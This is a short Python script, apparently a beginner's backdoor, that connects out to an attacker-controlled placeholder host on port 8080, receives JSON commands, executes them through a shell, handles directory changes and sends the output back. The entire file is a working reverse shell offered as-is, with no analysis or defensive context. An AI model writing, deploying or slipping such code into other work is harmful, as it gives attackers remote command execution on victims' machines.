#!/usr/bin/env python

import socket
import subprocess
import json
import os


def exec_cmd(cmd):
    return subprocess.check_output(cmd, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("hacker ip", 8080))


def send(cmd):
    data = json.dumps(cmd)
    connection.send(data)


def recive():
    res = ""
    while True:
        try:
            res += connection.recv(1024)
            return json.loads(res)
        except ValueError:
            continue

def change_dir(path):
  os.chdir(path)
  return "Changing directory to" + path

while True:
    command = recive()
    if command[0] == "exit":
        connection.close()
        exit()
    elif command[0] == "cd" and len(command) > 1:
      command_res = change_dir(command[1])
    else:
      command_res = exec_cmd(command)
    send(command_res)

connection.close()
